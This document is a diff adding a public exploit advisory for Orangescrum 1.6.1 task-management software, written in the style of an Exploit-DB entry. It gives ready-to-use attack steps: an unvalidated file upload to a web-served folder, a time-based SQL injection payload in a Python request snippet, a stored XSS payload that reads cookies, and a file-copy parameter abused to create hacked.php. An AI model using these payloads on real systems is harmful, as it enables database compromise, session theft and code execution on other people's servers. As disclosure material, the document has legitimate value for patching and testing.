@@ -1,0 +1,39 @@
+# Exploit Title: [Orangescrum 1.6.1 Multiple Vulnerabilities]
+# Google Dork: [NA]
+# Date: [July 9 2017]
+# Exploit Author: [tomplixsee@yahoo.co.id]
+# Author blog : [cupuzone.wordpress.com]
+# Vendor Homepage: [https://www.orangescrum.org/]
+# Software Link: [https://www.orangescrum.org/free-download]
+# Version: [1.6.1] 
+# Tested on: [Ubuntu 16.04]
+# CVE : [NA]
+
+Orangescrum is one of task management software written in PHP. 
+
+Its version 1.6.1 have multiple vulnerabilities. To exploit all of them, you have to log in first.
+
+1. Arbitrary File Upload
+Create or reply task. Then upload a file. The file will be uploaded into directory app/webroot/files/case_files, without any validation.
+It then can be accessed from url http://yourorangescrum/app/webroot/files/case_files/thefile
+
+2. SQL Injection (time based)
+Send a POST request to http://yourorangescrum/easycases/ajax_change_AssignTo  , with POST variables caseId and assignId.
+For example in python:
+url = "http://yourorangescrum/easycases/ajax_change_AssignTo"
+data = {"caseId":"1' AND SLEEP(5) AND 1='1","assignId":"1"}
+headers = {
+		'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+		'Accept': 'application/json, text/javascript, */*; q=0.01',
+		'Cookie': yourcookie
+}
+
+3. XSS (stored)
+Reply a task (choose html editor). Put your XSS code there. example <img src="nonexistimage" onerror="alert(document.cookie)">
+
+4. Arbitrary File Copy
+Look at an image profile url, it is something like this http://localhost/orangescrum/users/image_thumb/?type=photos&file=a6ebd6bd62ba537f37b7b8ac40aa626d.png&sizex=94&sizey=94&quality=100
+To copy add variable dest, so it will be like this http://localhost/orangescrum/users/image_thumb/?type=photos&file=a6ebd6bd62ba537f37b7b8ac40aa626d.png&sizex=94&sizey=94&quality=100&dest=hacked.php
+It will copy file a6ebd6bd62ba537f37b7b8ac40aa626d.png into hacked.php that will be stored in users/image_thumb/hacked.php
+Conditions : 
+- variable sizex and sizey must be the real width and height of file a6ebd6bd62ba537f37b7b8ac40aa626d.png (in this example)
